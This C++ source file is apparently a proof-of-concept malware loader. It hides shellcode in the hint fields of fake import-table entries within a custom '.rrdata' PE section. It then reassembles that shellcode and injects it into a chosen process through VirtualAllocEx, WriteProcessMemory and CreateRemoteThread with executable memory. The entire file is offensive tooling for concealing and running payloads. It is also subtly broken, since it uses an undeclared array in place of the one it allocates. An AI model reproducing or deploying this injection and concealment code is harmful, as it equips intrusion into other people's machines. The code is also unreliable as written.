#include <Windows.h>
#include <iostream>

// Inject shellcode. For the PoC, I used the simplest VirtualAllocEx + CreateRemoteThread method
void InjectShellcode(PBYTE shellcode, size_t shellcodeSize, DWORD pid) {
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (processHandle == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Error for opening the given pid!" << std::endl;
		return;
	}
	remoteBuffer = VirtualAllocEx(processHandle, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!remoteBuffer) {
		std::cout << "[!] Error on allocation !" << std::endl;
		return;
	}
	if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, shellcodeSize, NULL)) {
		std::cout << "[!] Error on remote writing !" << std::endl;
		return;
	}
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (remoteThread == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Error on remote thread creation !" << std::endl;
		return;
	}
	WaitForSingleObject(remoteThread, -1);
	CloseHandle(processHandle);
	HeapFree(GetProcessHeap(), 0, shellcode);
}

// To determine the fake entries, we can check its RVA, because we used our new .rrdata section to store them.
bool IsFakeEntry(PIMAGE_SECTION_HEADER fakeSection, DWORD importLookupTableRVA) {
	// If the Import Lookup Table of the entry is in our fake section, we can say that it is a fake entry added by us
	if (fakeSection->VirtualAddress < importLookupTableRVA && fakeSection->VirtualAddress + fakeSection->Misc.VirtualSize > importLookupTableRVA) {
		return true;
	}
	return false;
}

// Parse the shellcode from its hint/name table
PBYTE ParseTheShellcode(size_t &shellcodeSize) {
	PIMAGE_IMPORT_DESCRIPTOR* fakeImportList;
	int fakeDllEntryArraySize = 0;
	PBYTE TEBPtr = (PBYTE) __readgsqword(0x30);
	PBYTE PEBPtr = *((PBYTE*)(TEBPtr + 0x060));
	// Parse the image base address from the PEB and TEB
	PBYTE imageBaseAddress = *(PBYTE*)(PEBPtr + 0x10);
	PIMAGE_NT_HEADERS ntHeader = ((PIMAGE_NT_HEADERS)((size_t)imageBaseAddress + ((PIMAGE_DOS_HEADER)imageBaseAddress)->e_lfanew));
	PIMAGE_DATA_DIRECTORY importDirectory = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (importDirectory->VirtualAddress == NULL) {
		std::cout << "[!] Import Table not found !" << std::endl;
		return NULL;
	}
	size_t importDirectorySize = importDirectory->Size;
	size_t importDirectoryRVA = importDirectory->VirtualAddress;
	size_t offsetILT = 0;
	PIMAGE_IMPORT_DESCRIPTOR ITEntryCursor = NULL;
	PIMAGE_IMPORT_DESCRIPTOR fakeITEntryCursor = NULL;
	PIMAGE_THUNK_DATA fakeILTCursor = NULL;
	PIMAGE_SECTION_HEADER sectionHeaderCursor = (PIMAGE_SECTION_HEADER)(((uint64_t)ntHeader) + sizeof(IMAGE_NT_HEADERS));
	PIMAGE_SECTION_HEADER fakeSection = NULL;
	PIMAGE_IMPORT_BY_NAME hintNameTableEntry = NULL;
	// Traverse the sections to find the ..radata address
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		std::cout << sectionHeaderCursor->Name << std::endl;
		if (strncmp((LPCSTR)sectionHeaderCursor->Name,".rrdata",strlen((LPCSTR)sectionHeaderCursor->Name)) == 0) {
			fakeSection = sectionHeaderCursor;
			break;
		}
		sectionHeaderCursor = (PIMAGE_SECTION_HEADER)(((uint64_t)sectionHeaderCursor) + sizeof(IMAGE_SECTION_HEADER));
	}
	if(fakeSection == NULL){
		std::cout << "[!] Fake Section not found !" << std::endl;
		return NULL;
	}
	size_t parsedSize = 0;
	fakeImportList = (PIMAGE_IMPORT_DESCRIPTOR*) HeapAlloc(GetProcessHeap(), NULL, importDirectorySize);
	if (fakeDllEntryArray == NULL) {
		std::cout << "[!] Array allocation problem !" << std::endl;
		return NULL;
	}
	// From the importDirectory parse the entries
	for (; parsedSize < importDirectorySize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		ITEntryCursor = (PIMAGE_IMPORT_DESCRIPTOR)(importDirectoryRVA + (ULONG_PTR)imageBaseAddress + parsedSize);
		if (ITEntryCursor->OriginalFirstThunk == NULL && ITEntryCursor->FirstThunk == NULL) {
			break;
		}
		// If it is fake entry, it contains our shellcode
		if (IsFakeEntry(fakeSection, ITEntryCursor->OriginalFirstThunk)) {
			fakeDllEntryArray[fakeDllEntryArraySize++] = ITEntryCursor;
		}
	}
	if (fakeDllEntryArraySize == 0) {
		std::cout << "[!] Fake DLL Entries not found !" << std::endl;
		return NULL;
	}
	std::cout << "[+] Fake DLL Entries found !" << std::endl;
	for (int i = 0; i < fakeDllEntryArraySize; i++) {
		fakeITEntryCursor = fakeDllEntryArray[i];
		// Travese the Import Lookup Table of our fake entries
		fakeILTCursor = (PIMAGE_THUNK_DATA)(fakeITEntryCursor->OriginalFirstThunk+ imageBaseAddress);
		offsetILT = 0;
		// Traverse once for calculating size of the shellcode
		while (true) {
			fakeILTCursor = (PIMAGE_THUNK_DATA)(((uint64_t)fakeILTCursor) + offsetILT);
			if (fakeILTCursor->u1.AddressOfData == 0) {
				break;
			}
			hintNameTableEntry = (PIMAGE_IMPORT_BY_NAME)(fakeILTCursor->u1.AddressOfData + imageBaseAddress);
			shellcodeSize += 2;
			offsetILT = (sizeof(IMAGE_THUNK_DATA));
		}
	}
	std::cout << "[+] Size of the shellcode is " << shellcodeSize << std::endl;
	PBYTE shellcodeArea = (PBYTE) HeapAlloc(GetProcessHeap(), 0, shellcodeSize);
	PBYTE cursor = shellcodeArea;
	// Copy the shellcode to the newly allocated area
	for (int i = 0; i < fakeDllEntryArraySize; i++) {
		fakeITEntryCursor = fakeDllEntryArray[i];
		fakeILTCursor = (PIMAGE_THUNK_DATA)(fakeITEntryCursor->OriginalFirstThunk + imageBaseAddress);
		offsetILT = 0;
		while (true) {
			fakeILTCursor = (PIMAGE_THUNK_DATA)(((uint64_t)fakeILTCursor) + offsetILT);
			if (fakeILTCursor->u1.AddressOfData == 0) {
				break;
			}
			hintNameTableEntry = (PIMAGE_IMPORT_BY_NAME)(fakeILTCursor->u1.AddressOfData + imageBaseAddress);
			memcpy(cursor, &(hintNameTableEntry->Hint), sizeof(WORD));
			cursor += 2;
			offsetILT = (sizeof(IMAGE_THUNK_DATA));
		}
	}
	std::cout << "[+] Shellcode is merged !" << std::endl;
	return shellcodeArea;
}

PBYTE ReadFileFromDisk(LPCSTR fileName, uint64_t& fileSize) {
	std::cout << fileName << std::endl;
	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cout << "Failed to open the file\n";
		std::cout << GetLastError() << std::endl;
		return NULL;
	}
	fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		std::cout << ("Failed to get the file size\n");
		return NULL;
	}
	PBYTE fileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, fileSize);
	if (!fileBuffer) {
		std::cout << ("Failed to get the file size\n");
		return NULL;
	}
	DWORD dwBytesRead = 0;
	if (ReadFile(hFile, fileBuffer, fileSize, &dwBytesRead, NULL) == FALSE) {
		std::cout << ("Failed to alloc a buffer!\n");
		return NULL;
	}
	if (dwBytesRead != fileSize) {
		std::cout << ("Size problem!\n");
		return NULL;
	}
	CloseHandle(hFile);
	return fileBuffer;
}

int main(int argc, char *argv[]) {
	PBYTE mergedShellcode = NULL;
	uint64_t shellcodeSize = 0;
	uint64_t fileSize = 0;
	// Parse the shellcode from hint/name table
	mergedShellcode = ParseTheShellcode(shellcodeSize);
	// Inject the given shellcode to the process whose PID is given or execute it locally.
	if (argc < 2) {
		InjectShellcode(mergedShellcode, shellcodeSize, GetCurrentProcessId());
	}	
	else {
		InjectShellcode(mergedShellcode, shellcodeSize, atoi(argv[1]));
	}
	return 0;
}